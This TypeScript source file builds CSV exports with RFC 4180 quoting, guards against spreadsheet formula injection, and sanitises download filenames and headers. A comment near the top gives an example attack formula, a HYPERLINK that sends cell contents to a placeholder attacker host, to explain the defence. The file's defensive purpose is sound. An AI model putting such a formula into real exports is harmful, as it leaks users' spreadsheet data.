/**
 * CSV generation.
 *
 * Two separate problems, and conflating them is how spreadsheet exports become
 * a vulnerability:
 *
 *   RFC 4180 quoting keeps the file parseable. A comma, a quote or a newline
 *   inside a value has to be escaped or the columns shift.
 *
 *   Formula-injection protection keeps the file safe to open. Excel, Sheets and
 *   LibreOffice all treat a cell beginning with =, +, -, @, tab or carriage
 *   return as a formula, and will happily evaluate it. Our cells contain text
 *   taken verbatim from third-party web pages, so a company whose page contains
 *   `=HYPERLINK("https://attacker.example?d="&A1,"Click")` would otherwise get
 *   that formula into a customer's spreadsheet. Quoting alone does NOT prevent
 *   this — the formula character is inside the quotes and the spreadsheet
 *   evaluates it anyway.
 *
 * The fix is to prefix a dangerous cell with a single quote, which every major
 * spreadsheet reads as "this is text". The value stays readable; it stops being
 * executable.
 */

/**
 * Byte-order mark. Written as an escape rather than a literal so the character
 * is visible in source rather than being an invisible byte at the front of a
 * template string.
 */
const UTF8_BOM = '\ufeff';

/** Characters that make a spreadsheet treat a cell as a formula. */
const FORMULA_PREFIXES = ['=', '+', '-', '@', '\t', '\r'];

/**
 * Neutralises a value that a spreadsheet would evaluate.
 *
 * Exported for testing, because this is the function whose failure is silent
 * and remote.
 */
export function neutraliseFormula(value: string): string {
  if (value.length === 0) return value;
  return FORMULA_PREFIXES.some((prefix) => value.startsWith(prefix))
    ? `'${value}`
    : value;
}

/** RFC 4180 field escaping, applied after formula neutralisation. */
export function escapeCsvField(value: unknown): string {
  if (value === null || value === undefined) return '';

  const raw = Array.isArray(value) ? value.join('; ') : String(value);
  const safe = neutraliseFormula(raw);

  if (/[",\r\n]/.test(safe)) {
    return `"${safe.replace(/"/g, '""')}"`;
  }
  return safe;
}

export interface CsvColumn<T> {
  header: string;
  value: (row: T) => unknown;
}

/**
 * Renders rows to a CSV document.
 *
 * Column order comes from the array and is therefore stable across exports,
 * which matters to anyone who has built a spreadsheet formula against a
 * previous download.
 *
 * A UTF-8 BOM leads the file. Without it, Excel on Windows reads the bytes as
 * the system codepage and mangles every accented character in a European
 * company name — a small detail that makes the difference between a usable
 * export and one that looks broken.
 */
export function toCsv<T>(rows: readonly T[], columns: readonly CsvColumn<T>[]): string {
  const lines: string[] = [];

  lines.push(columns.map((column) => escapeCsvField(column.header)).join(','));

  for (const row of rows) {
    lines.push(columns.map((column) => escapeCsvField(column.value(row))).join(','));
  }

  // CRLF per RFC 4180.
  return `${UTF8_BOM}${lines.join('\r\n')}\r\n`;
}

/** A filename safe for Content-Disposition and for a filesystem. */
export function csvFilename(subject: string, kind: string, date: string): string {
  const slug = subject
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/^-|-$/g, '')
    .slice(0, 40);

  const day = date.slice(0, 10);
  return `${slug || 'research'}-${kind}-${day}.csv`;
}

/**
 * Content-Disposition for a download.
 *
 * The filename is quoted and stripped of quotes and control characters: it is
 * derived from user-supplied text, and a header value that can contain a
 * newline is a header-injection bug.
 */
export function contentDispositionFor(filename: string): string {
  const safe = filename.replace(/["\\\r\n]/g, '');
  return `attachment; filename="${safe}"`;
}
